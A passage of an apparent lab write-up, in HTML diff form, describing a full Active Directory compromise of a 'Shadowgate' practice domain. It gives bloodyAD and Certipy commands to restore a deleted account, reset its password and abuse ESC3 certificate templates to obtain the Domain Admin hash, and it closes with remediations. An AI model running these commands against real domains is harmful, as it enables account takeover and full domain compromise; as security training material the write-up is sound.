+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/certificate-manager-note_hu_99c35501f09a36df.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="446"
+        height="688"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/certificate-manager-note.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>That account (<code>sam.h</code>) did not appear in the BloodHound collection, suggesting it was deleted after the employee left.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/it-support-group_hu_e2b76cade3d801c5.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/it-support-group_hu_b10c60367dd97295.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/it-support-group_hu_9b9c4ff76c6d2d21.webp 950w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/it-support-group_hu_9b9c4ff76c6d2d21.webp 950w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="950"
+        height="422"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/it-support-group_hu_7f9273fbfcf4bc18.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/it-support-group_hu_5ab65171b4a1d92f.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/it-support-group_hu_7f9273fbfcf4bc18.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/it-support-group.png 950w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/it-support-group.png 950w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>A termination email confirmed this assumption.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/termination-email_hu_6319a7d1ec07d7ab.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/termination-email_hu_af5d50d7617a7454.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/termination-email_hu_4c550f84bc1312e7.webp 961w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/termination-email_hu_4c550f84bc1312e7.webp 961w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="961"
+        height="600"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/termination-email_hu_faed330491ebe37e.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/termination-email_hu_d70cbcb2febb170f.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/termination-email_hu_faed330491ebe37e.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/termination-email.png 961w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/termination-email.png 961w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I queried deleted user objects from the Active Directory recycle bin.</p>
+<pre tabindex="0"><code>Get-ADObject -Filter &#39;isDeleted -eq $true -and objectClass -eq &#34;user&#34;&#39; -IncludeDeletedObjects -Properties * | fl name,lastKnownParent,DeletedTime
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/deleted-objects-query_hu_ec889d694360c2f6.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/deleted-objects-query_hu_67a704a544e53250.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/deleted-objects-query_hu_6f6961e765d7636.webp 962w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/deleted-objects-query_hu_6f6961e765d7636.webp 962w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="962"
+        height="138"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/deleted-objects-query_hu_c9b6959ffa2ae34.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/deleted-objects-query_hu_794f5caa5e2f8699.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/deleted-objects-query_hu_c9b6959ffa2ae34.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/deleted-objects-query.png 962w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/deleted-objects-query.png 962w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I restored the deleted <code>sam.h</code> account from the recycle bin using <strong>BloodyAD</strong>.</p>
+<pre tabindex="0"><code>bloodyAD -u oscar.m -p &#39;&lt;REDACTED&gt;&#39; -d shadowgate.local -H 10.1.44.124 set restore &#34;sam.h&#34;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/restore-account_hu_2490fd3bbf9bf5fb.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/restore-account_hu_29d8589dfcaf960f.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/restore-account_hu_5b810d12399a4f82.webp 924w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/restore-account_hu_5b810d12399a4f82.webp 924w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="924"
+        height="75"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/restore-account_hu_92bef4cdd1d19006.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/restore-account_hu_12e17c22312a4123.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/restore-account_hu_92bef4cdd1d19006.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/restore-account.png 924w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/restore-account.png 924w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I then reset its password.</p>
+<pre tabindex="0"><code>bloodyAD -u oscar.m -p &#39;&lt;REDACTED&gt;&#39; -d shadowgate.local --host 10.1.44.124 set password &#34;sam.h&#34; &#39;&lt;REDACTED&gt;&#39;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/reset-restored-password_hu_e700c9237cbc1863.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/reset-restored-password_hu_7e718504e9b0ff08.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/reset-restored-password_hu_dece33e25d85d216.webp 943w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/reset-restored-password_hu_dece33e25d85d216.webp 943w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="943"
+        height="69"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/reset-restored-password_hu_8e7417ac567b6490.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/reset-restored-password_hu_22353b6440114285.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/reset-restored-password_hu_8e7417ac567b6490.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/reset-restored-password.png 943w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/reset-restored-password.png 943w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Confirming the account is active again.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/account-active_hu_854a9649fa61d45d.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/account-active_hu_cf0b326bd0526c0a.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/account-active_hu_708e7c1f8cd4b75b.webp 951w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/account-active_hu_708e7c1f8cd4b75b.webp 951w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="951"
+        height="150"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/account-active_hu_dc01c28c99369141.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/account-active_hu_8525c2a5c66a2a3d.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/account-active_hu_dc01c28c99369141.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/account-active.png 951w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/account-active.png 951w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="certificate-enumeration" class="relative group">Certificate Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#certificate-enumeration" aria-label="Anchor">#</a></span></h3><p>I used <strong>Certipy</strong> to enumerate the CA for vulnerable templates.</p>
+<pre tabindex="0"><code>certipy-ad find -u sam.h@shadowgate.local -p &#39;&lt;REDACTED&gt;&#39; -dc-ip 10.1.44.124 -vulnerable -ldap-scheme ldap -vulnerable -stdout
+</code></pre><p>The output revealed the certificate authority is vulnerable to <strong>ESC3</strong> and <strong>ESC7</strong>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulnerabilities_hu_7e9a85e876a17887.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulnerabilities_hu_d2d8be9be9a73a45.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulnerabilities_hu_749d7c2a028e8ad3.webp 855w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulnerabilities_hu_749d7c2a028e8ad3.webp 855w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="855"
+        height="103"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulnerabilities_hu_e4b75e0e55283bd6.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulnerabilities_hu_9503eeb470509cc3.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulnerabilities_hu_e4b75e0e55283bd6.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulnerabilities.png 855w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulnerabilities.png 855w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulns-details_hu_e6421f0abd53e1a.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulns-details_hu_e1d66ccd90ff748.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulns-details_hu_98bb03ecadac69b6.webp 746w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulns-details_hu_98bb03ecadac69b6.webp 746w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="746"
+        height="115"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulns-details_hu_53f2b2a509f81edf.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulns-details_hu_236d1163d76a85bb.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulns-details_hu_53f2b2a509f81edf.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulns-details.png 746w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/certipy-vulns-details.png 746w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="esc3-exploitation" class="relative group">ESC3 Exploitation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#esc3-exploitation" aria-label="Anchor">#</a></span></h3><p>ESC3 (Enrollment Agent) allows a certificate on the <code>Shadowgate-EnrollmentAgent</code> template to be requested, then used to request certificates <strong>on behalf of</strong> other principals. Because the termination email stated a specific endpoint must be used, I requested the certificate using the <code>-dynamic-endpoint</code> flag.</p>
+<pre tabindex="0"><code>certipy req -u &#39;sam.h@shadowgate.local&#39; -p &#39;&lt;REDACTED&gt;&#39; -dc-ip 10.1.44.124 -ca &#39;Shadowgate-CA&#39; -target SG-DC01.shadowgate.local -template &#39;Shadowgate-EnrollmentAgent&#39; -dynamic-endpoint
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/esc3-dynamic-endpoint_hu_e10f22e30fa87114.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/esc3-dynamic-endpoint_hu_7e0de44808a9a7cf.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/esc3-dynamic-endpoint_hu_d645ddd893cf5e60.webp 957w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/esc3-dynamic-endpoint_hu_d645ddd893cf5e60.webp 957w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="957"
+        height="292"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/esc3-dynamic-endpoint_hu_83df091eb160c328.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/esc3-dynamic-endpoint_hu_9e77ebdc6b59da67.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/esc3-dynamic-endpoint_hu_83df091eb160c328.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/esc3-dynamic-endpoint.png 957w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/esc3-dynamic-endpoint.png 957w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>This produced a valid Enrollment Agent certificate for <code>sam.h</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/enrollment-agent-cert_hu_9d24c2fc35e78534.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/enrollment-agent-cert_hu_801d15d5317e216f.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/enrollment-agent-cert_hu_fa95aa4a31d3b667.webp 981w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/enrollment-agent-cert_hu_fa95aa4a31d3b667.webp 981w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="981"
+        height="216"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/enrollment-agent-cert_hu_86d7c7f6f429393a.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/enrollment-agent-cert_hu_90065c16a384c899.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/enrollment-agent-cert_hu_86d7c7f6f429393a.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/enrollment-agent-cert.png 981w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/enrollment-agent-cert.png 981w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>With a valid Enrollment Agent certificate, I requested a certificate <strong>on behalf of</strong> the <code>Administrator</code> against the <code>User</code> template.</p>
+<pre tabindex="0"><code>certipy req -u &#39;sam.h@shadowgate.local&#39; -p &#39;&lt;REDACTED&gt;&#39; -dc-ip 10.1.44.124 -ca &#39;ShadowGate-CA&#39; -target SG-DC01.shadowgate.local -template User -on-behalf-of &#39;shadowgate\administrator&#39; -pfx sam.h.pfx
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/on-behalf-admin_hu_836d6696127395a8.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/on-behalf-admin_hu_b4e57b75b92b2dac.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/on-behalf-admin_hu_f627661b1ed1dac9.webp 951w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/on-behalf-admin_hu_f627661b1ed1dac9.webp 951w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="951"
+        height="239"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/on-behalf-admin_hu_d7cdcc9ffdf0323d.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/on-behalf-admin_hu_111b78d566707748.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/on-behalf-admin_hu_d7cdcc9ffdf0323d.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/on-behalf-admin.png 951w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/on-behalf-admin.png 951w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Authenticating with the Administrator certificate, I dumped the NTLM hash of the Domain Admin.</p>
+<pre tabindex="0"><code>certipy auth -pfx &#39;administrator.pfx&#39; -dc-ip 10.1.44.124
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-cert-auth_hu_65bbd80835303244.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-cert-auth_hu_5eb02c25af2ede2d.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-cert-auth_hu_9ba642f30726b00a.webp 951w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-cert-auth_hu_9ba642f30726b00a.webp 951w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="951"
+        height="236"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-cert-auth_hu_353e023da1fc83e2.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-cert-auth_hu_d5cc3e09faf6fceb.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-cert-auth_hu_353e023da1fc83e2.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-cert-auth.png 951w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-cert-auth.png 951w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>With the Domain Admin hash, I authenticated as <code>administrator</code> and captured the final flag, completing the domain compromise.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-shell_hu_66850af687f0b700.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-shell_hu_c675363a30578cce.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-shell_hu_56827dabf23216c2.webp 944w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-shell_hu_56827dabf23216c2.webp 944w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="944"
+        height="217"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-shell_hu_497db3c0b7f34e59.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-shell_hu_721c5c97844f3168.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-shell_hu_497db3c0b7f34e59.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-shell.png 944w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/admin-shell.png 944w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/final-flag_hu_2985f4e5236df9e8.webp 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/final-flag_hu_51f864d2af05738b.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/final-flag_hu_ec6b3494fbd37b19.webp 949w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/shadowgate-hacksmarter/final-flag_hu_ec6b3494fbd37b19.webp 949w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="949"
+        height="543"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/shadowgate-hacksmarter/final-flag_hu_8de13e84bc5677dd.png" srcset="https://k40tik.github.io/posts/shadowgate-hacksmarter/final-flag_hu_7f9c45bec52105f4.png 330w,https://k40tik.github.io/posts/shadowgate-hacksmarter/final-flag_hu_8de13e84bc5677dd.png 660w
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/final-flag.png 949w
+          
+          
+            ,https://k40tik.github.io/posts/shadowgate-hacksmarter/final-flag.png 949w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h2><p>This engagement demonstrated a full Active Directory domain compromise starting from nothing but VPN access. The attack chain relied on chaining together multiple identity-based misconfigurations:</p>
+<ol>
+<li><strong>Username discovery</strong> via a developer portal that leaked the AD naming convention.</li>
+<li><strong>Unauthenticated access</strong> to an upload portal running as <code>mitch.r</code>.</li>
+<li><strong>NTLM hash capture</strong> via a malicious <code>.lnk</code> file and Responder.</li>
+<li><strong>ACL abuse chain:</strong> <code>ForceChangePassword</code> → <code>WriteOwner</code>/<code>WriteDACL</code> → <code>GenericAll</code> to progressively escalate to the MSSQL service account.</li>
+<li><strong>MSSQL impersonation</strong> to reach a Remote Management user and bypass logon-hour restrictions.</li>
+<li><strong>Deleted object restoration</strong> to resurrect the old enrollment agent account <code>sam.h</code>.</li>
+<li><strong>ESC3 ADCS attack</strong> to impersonate the Domain Administrator and dump the domain.</li>
+</ol>
+<p>To secure the environment, the following remediations are recommended:</p>
+<ul>
+<li><strong>Restrict object control privileges:</strong> Audit and remove excessive ACLs (<code>GenericAll</code>, <code>WriteOwner</code>, <code>WriteDACL</code>, <code>ForceChangePassword</code>) across the domain.</li>
+<li><strong>Disable the AD Recycle Bin exposure:</strong> Ensure restore permissions are limited and monitor restore operations.</li>
+<li><strong>Harden ADCS templates:</strong> Enforce CA manager approval (ESC7) and application-policy settings (ESC3), and disable dynamic endpoints if not required.</li>
+<li><strong>Block SMB hash capture:</strong> Enable SMB signing and disable NTLM authentication where possible.</li>
+<li><strong>Secure the upload portal:</strong> Enforce authentication, validate file types, and isolate the file-processing service account.</li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="960"
+        height="1280"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="k40t1k"
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/img/k40t1k_hu_ebd2a57fb32cf973.jpeg" srcset="https://k40tik.github.io/img/k40t1k_hu_210ca2abc75c60a7.jpeg 330w,https://k40tik.github.io/img/k40t1k_hu_ebd2a57fb32cf973.jpeg 660w
+          
+            ,https://k40tik.github.io/img/k40t1k.jpeg 960w
+          
+          
+            ,https://k40tik.github.io/img/k40t1k.jpeg 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          k40t1k
+        </div>
+      
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/jkilonzi"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
